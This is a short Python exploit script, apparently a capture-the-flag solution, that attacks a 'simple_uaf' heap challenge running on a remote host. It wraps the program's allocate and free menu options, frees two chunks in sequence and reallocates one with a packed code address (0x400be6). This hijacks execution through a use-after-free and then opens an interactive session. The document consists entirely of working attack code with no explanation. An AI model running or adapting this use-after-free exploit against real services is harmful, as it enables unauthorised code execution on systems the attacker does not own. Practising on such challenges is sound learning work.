from yeonnic import *

#p=process("./simple_uaf")
p=remote("211.110.229.114", 16495)

print p.recv()

def malloc(size,data):
    p.sendline("1")
    print p.recv()
    p.sendline(str(size))
    print p.recv()
    p.sendline(data)
    print p.recv()

def free(index):
    p.sendline("2")
    print p.recv()
    p.sendline(str(index))
    print p.recv()


malloc(50,"AAAA")
malloc(10,"BBBB")
free(1)
free(0)
malloc(10,p64(0x400be6))

p.interactive()


